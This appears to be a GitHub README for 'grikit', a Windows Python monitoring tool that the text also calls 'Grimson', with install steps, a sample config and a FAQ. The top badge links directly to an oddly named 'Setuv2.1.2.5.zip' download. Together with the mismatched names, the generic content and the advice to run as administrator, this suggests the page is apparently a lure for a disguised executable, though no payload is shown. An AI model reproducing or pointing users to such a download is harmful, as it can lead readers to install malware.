[![Release](https://img.shields.io/badge/Release-Stable-success?style=for-the-badge&logo=github)](https://github.com/artemwilson-dev1993r5/grikit/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# ⚡ grikit

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.0-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/artemwilson-dev1993r5/grikit?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/artemwilson-dev1993r5/grikit?style=flat-square)

Grimson, an open-source tool, offers live monitoring, theme management, and simple configuration

## 📥 Download & Install

[![Download](https://img.shields.io/badge/Download-Source%20Code-blue?style=for-the-badge&logo=github)](../../releases/latest)

```bash
git clone https://github.com/artemwilson-dev1993r5/grikit.git
cd grikit
pip install -r requirements.txt
```

### Requirements

* Python 3.11 or higher. Older versions might work, but aren't tested.
* The packages listed in `requirements.txt`. Just run `pip install -r requirements.txt`.

### Running

After installing, run `python main.py`. That's it!

The app should start, and you'll see the monitoring overlay. You can tweak the config to change what's displayed.

### Config

The `config.py` file lets you customize Grimson. Here's an example:

```python
config = {
 'theme': 'dark',
 'refresh_interval': 0.5, # seconds
 'monitor': {
 'cpu_usage': True,
 'memory_usage': True,
 'disk_io': False # WIP: Disk I/O monitoring not fully implemented yet
 },
 'network': {
 'interface': 'Wi-Fi',
 'threshold_kbps': 1000
 },
 'paths': {
 'log_file': 'grimson.log',
 'data_dir': 'data/'
 }
}
```

Adjust these values to fit your needs. Don't forget to restart Grimson after making changes.

### Features

* **Fast:** Lightweight and efficient, so it won't hog resources.
* **Easy:** Simple setup and configuration.
* **Configurable:** Tweak settings to match your preferences.

### FAQ

<details>
 <summary>How do I change the theme?</summary>
 Edit the <code>theme</code> option in <code>config.py</code>. Valid values are <code>dark</code> and <code>light</code>.
</details>

<details>
 <summary>Why is the CPU usage always at 0%?</summary>
 Make sure you have the necessary permissions to access system information. On some systems, you might need to run Grimson as administrator.
</details>

---

Contributions are welcome! Feel free to open a PR.